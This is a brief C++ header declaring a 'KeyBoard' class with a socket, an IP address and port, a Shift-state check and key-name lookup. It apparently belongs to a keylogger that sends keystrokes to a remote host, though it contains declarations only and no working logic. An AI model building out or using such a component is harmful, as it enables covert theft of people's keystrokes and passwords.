#pragma once
#include "Socket.h"
#include <fstream>


class KeyBoard
{
public:
	KeyBoard(char*ip, int port);
	~KeyBoard();

private:
	string checkstringlistname;
	const int KeyBoardValue = 0x80000000;
	Socket socket;

	bool JudgeShift();
	string stringGetKeyName(int NumKey);
};

